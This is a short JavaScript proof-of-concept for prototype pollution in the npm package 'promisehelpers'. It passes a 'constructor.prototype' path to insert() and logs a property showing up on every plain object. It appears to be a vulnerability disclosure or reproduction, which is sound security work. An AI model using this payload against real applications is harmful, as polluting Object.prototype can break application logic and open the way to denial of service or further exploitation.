var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const promisehelpers = require('promisehelpers');
obj = {};
console.log({}.polluted);
promisehelpers.insert([
    'constructor',
    'prototype',
    'polluted'
], 'yes')(obj);
console.log({}.polluted);